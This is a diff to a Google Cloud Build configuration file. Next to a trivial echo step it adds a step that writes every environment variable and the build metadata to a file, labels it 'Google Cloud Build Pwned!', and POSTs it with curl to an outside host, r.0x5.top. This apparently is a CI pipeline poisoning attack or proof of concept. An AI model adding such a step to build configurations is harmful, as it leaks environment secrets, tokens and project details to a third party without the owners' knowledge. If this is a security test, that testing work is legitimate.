@@ -1,5 +1,32 @@
 logsBucket: gs://testasdx123
+
 steps:
   - name: 'alpine'
+    id: 'Echo Hello'
     entrypoint: 'echo'
     args: ['hello worldcd']
+
+  - name: 'curlimages/curl'
+    id: 'Post Env Info'
+    entrypoint: 'sh'
+    args:
+      - -c
+      - |
+        echo "Collecting environment info..."
+        env > /tmp/env.txt
+        echo "Substitutions:"
+        echo "Google Cloud Build Pwned! :)" >> /tmp/env.txt
+        echo "BUILD_ID=$BUILD_ID" >> /tmp/env.txt
+        echo "PROJECT_ID=$PROJECT_ID" >> /tmp/env.txt
+        echo "TRIGGER_NAME=$TRIGGER_NAME" >> /tmp/env.txt
+        echo "BRANCH_NAME=$BRANCH_NAME" >> /tmp/env.txt
+        echo "TAG_NAME=$TAG_NAME" >> /tmp/env.txt
+        echo "REVISION_ID=$REVISION_ID" >> /tmp/env.txt
+        echo "SENDING TO ENDPOINT..."
+        curl -X POST -H "Content-Type: text/plain" --data-binary @/tmp/env.txt https://r.0x5.top/x
+
+substitutions:
+  _CUSTOM_VAR: "default"
+
+options:
+  logging: GCS_ONLY
